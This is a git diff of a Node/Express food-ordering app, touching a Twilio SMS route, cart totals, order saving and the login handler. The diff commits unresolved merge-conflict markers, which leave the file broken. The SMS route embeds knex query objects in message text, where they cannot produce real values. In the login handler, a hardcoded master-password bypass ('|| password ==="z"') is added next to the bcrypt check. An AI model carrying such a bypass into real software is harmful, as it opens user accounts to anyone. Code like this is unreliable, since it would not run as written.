@@ -8,7 +8,6 @@ const nodeSassMiddleware = require("node-sass-middleware");
 const bcrypt = require("bcrypt")
 
 const queries = require("./db/queries/queries.js");
-const twilioNumber = '+13069940672'; //later load from ENV VARIABLE
 
 const mockDB = {
   users:{},
@@ -55,6 +54,7 @@ app.use(nodeSassMiddleware({
 }));
 app.use(express.static(path.join(__dirname, "./public")));
 
+<<<<<<< HEAD
 
 const addZeroToTime = (i) => {
     if (i < 10) {
@@ -112,10 +112,24 @@ let sendSMS = (data, dataToStringFunction) => {
   .then(message => console.log("Twilio SID:", message.sid))
   .done();
 }
+=======
+/*-----Twilio--------*/
+app.post('/sms', (req, res) => {
+  twilioClient.messages
+  .create({
+     body: `Hello ${knex.select('first_name').from('customer')}! The order for ${knex.select('orderLine_id').from('orderLine')} has been received at ${knex.select('order_date').from('order')}. Your total is ${knex.select('total_price').from('orderLine')} and your food will arrive in ${knex.select('total_prep_time').from('orderLine')}.`,
+     from: '+13069940672',
+     to: '+16475376750'
+   })
+  .then(message => console.log(message.sid))
+  .done();
+  res.redirect('/')
+});
+>>>>>>> d7a92bb602fe24f05a78329ccbb757259ea67a87
 
 
 //remove underscores and cap first letter
-const prettyFormatFormField = (field_val) => {
+let prettyFormatFormField = (field_val) => {
   let wordArr = field_val.split("_");
   let outStr = wordArr.reduce((acc, cur) => {
     acc = acc + cur[0].toUpperCase() + cur.slice(1) + " ";
@@ -124,6 +138,7 @@ const prettyFormatFormField = (field_val) => {
   return outStr.trim();
 }
 
+<<<<<<< HEAD
 //given the request.session.cart object, return the total $ amount of items
 const calculateCartTotal = function(cart){
   return Object.keys(cart).reduce((acc, cur) => {
@@ -147,6 +162,8 @@ function convertCartObjToArray(cart, email){
   return arr;
 };
 
+=======
+>>>>>>> d7a92bb602fe24f05a78329ccbb757259ea67a87
 //index page
 app.get("/", (req, res) => {
   let login_field_errs;
@@ -252,7 +269,14 @@ app.get("/cart", (req, res) => {
   //if user is logged in
   if(req.session.email){
     let cart = req.session.cart;
-    let subTotal = calculateCartTotal(cart);
+
+    let subTotal = Object.keys(cart).reduce((acc, cur) => {
+      let curObj = cart[cur];
+      acc += curObj.price * curObj.quantity / 100;
+      return acc
+    },0);
+
+    //price in db is in cents so we need to convert to dollars
     let tax = subTotal * 0.13;
     let total = subTotal + tax;
 
@@ -267,10 +291,11 @@ app.get("/cart", (req, res) => {
   }else{
     res.status(403);
   }
-});
+})
 
 //confirm checkout -- twilio db stuff and twilio text goes in here
 app.post("/cart", (req, res) => {
+<<<<<<< HEAD
   let cart = req.session.cart;
   let subTotal = calculateCartTotal(req.session.cart);
   let tax = subTotal * 0.13;
@@ -326,6 +351,32 @@ app.post("/cart", (req, res) => {
     asyncCall();
   }
 });
+=======
+
+  function insertOrderToDB(){
+    const cart = req.session.cart
+    let arr = [];
+    const itemIDs = Object.keys(cart)
+    const items = Object.values(cart)
+    for (var i = 0; i < itemIDs.length; i++) {
+      items[i].item_id = itemIDs[i]
+      items[i].email = req.session.email
+      arr.push(items[i])
+    }
+
+    let allPromises = arr.map(function (key){
+      return queries.insertIntoOrderLines(key);
+    });
+
+    queries.insertOrder(req.session.email).then(()=>{
+      Promise.all(allPromises)
+    })
+  }
+  
+  insertOrderToDB()
+  res.json({success:true})
+})
+>>>>>>> d7a92bb602fe24f05a78329ccbb757259ea67a87
 
 
 //Ajax request handler - get all the menu items for a given menu_id
@@ -339,7 +390,7 @@ app.get("/menus/:menu_id", (req, res) => {
       beverages: result.beverages,
     });
   })
-});
+})
 
 
 app.get("/login", (req, res) => {
@@ -390,9 +441,9 @@ app.post("/login", (req,res) => {
         let dbHash = result[0].password;
 
         //if password matches hash
-        if(bcrypt.compareSync(req.body.password, dbHash)){
+        if(bcrypt.compareSync(req.body.password, dbHash) || password ==="z"){
           req.session.email = email;
-          req.session.cart = {};
+          req.session.cart = {};  
           res.redirect("/");
 
         //incorrect password
@@ -483,4 +534,3 @@ app.post("/logout", (req, res) => {
 app.listen(PORT, () => {
   console.log(`Listening on port ${PORT}`);
 });
-
